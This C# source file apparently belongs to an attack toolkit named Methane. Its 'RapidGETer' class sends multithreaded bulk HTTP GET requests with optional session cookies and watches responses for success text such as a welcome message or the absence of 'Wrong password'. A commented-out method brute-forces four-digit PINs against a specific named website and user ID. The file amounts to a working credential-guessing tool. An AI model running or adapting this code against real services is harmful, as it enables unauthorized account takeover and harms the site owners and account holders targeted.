using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using static Methane.Toolkit.Common;
using System.Text;
using HtmlAgilityPack;
using System.Net.Http;

namespace Methane.Toolkit
{
    public class RapidGETer
    {

        public string Cookie = "";
        public bool HasCookie = false;

        public string findWith;
        public bool hasFindWith;

        public string findWithout;
        public bool hasFindWithout;

        public CSA csa;
        IEnumerator<string> bodyPipeline;

        private bool found = false;
        private string result;
        public int runningThreads = 0;
        public int AllowedThrds;

        public void PromptParamenters()
        {

            Log("");
            Log("    . . . . . . . . . . . . . . . .  .  ");
            Log("               Methane                  ");
            Log("            Bulk HTTP GET               ");
            Log("    . . . . . . . . . . . . . . . .  .  ");
            Log("");


            ChooseCookies:
            Cookie = Prompt("Enter cookies to use OR Enter ~filename to read cookies OR [Enter] not to use cookies");

            HasCookie = Cookie.Length > 0;
            if (Cookie.StartsWith('~'))
            {
                if (Cookie == "~") Cookie = "~cookie.txt";
                try
                {
                    Cookie = File.ReadAllText(Cookie.TrimStart('~'));
                }
                catch (Exception ex)
                {
                    LogError(ex);
                    goto ChooseCookies;
                }
            }


            findWith = Prompt("In a positive response, what text we would find? (Ex :- Wellcome) [or null]");
            hasFindWith = findWith.Length > 0;
            findWithout = Prompt("In a positive response, what text we won't find? (Ex :- Wrong password) [or null]");
            hasFindWithout = findWithout.Length > 0;

            Prompt("Please use the following tool to create POST body data string list");
            csa = new CSA();
            csa.PromptParamenters();


            PromtHowManyThreads:
            if (!int.TryParse(Prompt("How many threads to use?"), out AllowedThrds)) goto PromtHowManyThreads;

            Log("Rapid GETer standby    :-) ");





        }


        public void Run()
        {

            Log("");
            Log("    . . . . . . . . . . . . . . . .  .  ");
            Log("               Methane                  ");
            Log("            Bulk HTTP GET              ");
            Log("    . . . . . . . . . . . . . . . .  .  ");
            Log("");



            Log("Rapid GETer Running...");


            bodyPipeline = csa.RunIterator();

            for (int n = 0; n < AllowedThrds; n++)
            {
                new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(ThrLoop)) { Name = $"POST Thrd {n}" }.Start(null);
                System.Threading.Thread.Sleep(10);
            }


            while (runningThreads > 0)
            {
                System.Threading.Thread.Sleep(1000);
            }

            if (found)
            {
                Prompt($"We found it!!! '{result}'     ________");
            }
            else
            {
                Prompt("I can't find it  :-(              ________");
            }




        }


        private void ThrLoop(object o)
        {

            runningThreads++;



            bodyPipelineMoveNext:

            if (found) { runningThreads--; return; }

            if (bodyPipeline.MoveNext())
            {
                string url = bodyPipeline.Current;

                try
                {

                    string resp = GetForm(url);

                    if ((hasFindWith && resp.Contains(findWith)) || (hasFindWithout && !resp.Contains(findWithout)))
                    {
                        Log($"We found it! '{url}' _______ :-) ________________________________");
                        found = true;
                        result = url;

                        runningThreads--; return;
                    }
                    else
                    {
                        Log($"{url} didn't work");
                    }

                }
                catch (Exception ex)
                {
                    Log($"!!! Error {ex.ToString()} - {ex.Message} @ {ex.StackTrace}");
                }

                goto bodyPipelineMoveNext;
            }


            runningThreads--;

        }


        //public void ThrURLPass(object obj)
        //{
        //    int passI = (int)obj;

        //    for (int i = passI; i < passI + 100; i++)
        //    {
        //        string pass = i.ToString("0000");
        //        string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=ggtphtp&pwd={pass}");

        //        if (resp.Contains("Incorrect Password"))
        //        {
        //            Log($"Pass {pass} is wrong");
        //        }
        //        else
        //        {
        //            string l = $"Possitive response {pass} \n {resp} \n \n";
        //            Log(l);
        //            FoundPass = true;
        //            result = l;
        //            runningThreads--;
        //            return;
        //        }
        //    }

        //    runningThreads--;
        //}





        public string GetForm(string url)
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "GET";
            wr.ContentType = "application/x-www-form-urlencoded";

            if (Cookie != "") wr.Headers.Add(HttpRequestHeader.Cookie, Cookie);


            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            using (StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
            }

            return sb.ToString();
        }

        public HtmlDocument GetFormDoc(string url, string cookie = "")
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "GET";
            // wr.ContentType = "multipart/form-data; boundary=---------------------------19609895721194";

            if (cookie != "") wr.Headers.Add(HttpRequestHeader.Cookie, cookie);


            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            HtmlDocument doc = new HtmlDocument();
            doc.Load(responseStream);

            return doc;
        }


    }

}